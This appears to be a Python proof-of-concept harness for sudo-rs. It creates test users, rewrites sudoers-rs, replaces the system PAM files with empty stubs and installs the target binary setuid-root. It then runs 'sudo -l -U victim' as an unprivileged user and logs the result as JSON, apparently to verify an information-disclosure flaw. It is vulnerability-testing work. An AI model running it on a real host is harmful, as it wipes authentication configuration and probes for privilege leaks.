#!/usr/bin/env python3
import argparse
import json
import os
import pwd
import grp
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path


SUDOERS_RS = Path("/etc/sudoers-rs")
PAM_D = Path("/etc/pam.d")
PAM_SUDO = PAM_D / "sudo"
PAM_OTHER = PAM_D / "other"
PAM_CONF = Path("/etc/pam.conf")
INSTALL_DIR = Path("/tmp/poc-sudo-rs-setuid")
INSTALL_PATH = INSTALL_DIR / "sudo"

SUDOERS_CONTENT = (
    "invoker ALL=(ALL:ALL) NOPASSWD: /bin/true\n"
    "victim ALL=(ALL:ALL) ALL\n"
)
PAM_STUB = "# PoC PAM stub: intentionally no module lines.\n"


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=10.0)
    return parser.parse_args()


def ensure_user(name):
    try:
        return pwd.getpwnam(name)
    except KeyError:
        subprocess.run(
            ["useradd", "-m", name],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=True,
        )
        return pwd.getpwnam(name)


def write_root_file(path, content, mode):
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    os.chown(path, 0, 0)
    os.chmod(path, mode)


def configure_system(binary_path):
    ensure_user("invoker")
    ensure_user("victim")

    write_root_file(SUDOERS_RS, SUDOERS_CONTENT, 0o440)
    write_root_file(PAM_SUDO, PAM_STUB, 0o644)
    write_root_file(PAM_OTHER, PAM_STUB, 0o644)
    write_root_file(PAM_CONF, PAM_STUB, 0o644)

    source = Path(binary_path)
    if not source.is_file():
        raise FileNotFoundError(f"target binary does not exist: {binary_path}")

    INSTALL_DIR.mkdir(parents=True, exist_ok=True)
    os.chown(INSTALL_DIR, 0, 0)
    os.chmod(INSTALL_DIR, 0o755)

    if INSTALL_PATH.exists() or INSTALL_PATH.is_symlink():
        INSTALL_PATH.unlink()
    shutil.copyfile(source, INSTALL_PATH)
    os.chown(INSTALL_PATH, 0, 0)
    os.chmod(INSTALL_PATH, 0o4755)


def invoker_preexec():
    pw = pwd.getpwnam("invoker")
    os.initgroups(pw.pw_name, pw.pw_gid)
    os.setgid(pw.pw_gid)
    os.setuid(pw.pw_uid)


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    signum = -returncode
    try:
        return signal.Signals(signum).name
    except ValueError:
        return f"SIG{signum}"


def run_invocation(command, timeout):
    pw = pwd.getpwnam("invoker")
    env = os.environ.copy()
    env.update(
        {
            "HOME": pw.pw_dir,
            "LOGNAME": pw.pw_name,
            "USER": pw.pw_name,
            "SHELL": pw.pw_shell or "/bin/sh",
        }
    )
    env.pop("SUDO_ASKPASS", None)

    started = time.monotonic()
    proc = subprocess.Popen(
        command,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=env,
        preexec_fn=invoker_preexec,
    )
    timed_out = False
    try:
        stdout_b, stderr_b = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        proc.kill()
        stdout_b, stderr_b = proc.communicate()

    runtime_ms = int(round((time.monotonic() - started) * 1000))
    stdout = stdout_b.decode("utf-8", errors="replace")
    stderr = stderr_b.decode("utf-8", errors="replace")

    if timed_out:
        return None, "SIGKILL", True, runtime_ms, stdout, stderr
    return proc.returncode, signal_name(proc.returncode), False, runtime_ms, stdout, stderr


def emit(result, json_out):
    text = json.dumps(result, sort_keys=False, separators=(",", ":"))
    if json_out:
        out_path = Path(json_out)
        out_path.parent.mkdir(parents=True, exist_ok=True)
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(text)
            f.write("\n")
    print(text)


def main():
    args = parse_args()
    command = [str(INSTALL_PATH), "-l", "-U", "victim"]
    result = {
        "binary": args.binary,
        "command": command,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "combined_output", "value": "", "path": None},
        "error": None,
    }

    started = time.monotonic()
    try:
        configure_system(args.binary)
        rc, sig, timed_out, runtime_ms, stdout, stderr = run_invocation(
            command, args.timeout
        )
        combined = stdout + stderr
        result.update(
            {
                "returncode": rc,
                "signal": sig,
                "timed_out": timed_out,
                "runtime_ms": runtime_ms,
                "stdout": stdout,
                "stderr": stderr,
                "observable": {
                    "kind": "combined_output",
                    "value": combined,
                    "path": None,
                },
            }
        )
    except Exception as exc:
        result["runtime_ms"] = int(round((time.monotonic() - started) * 1000))
        result["error"] = f"{type(exc).__name__}: {exc}"
        result["observable"] = {"kind": "combined_output", "value": "", "path": None}

    emit(result, args.json_out)


if __name__ == "__main__":
    main()
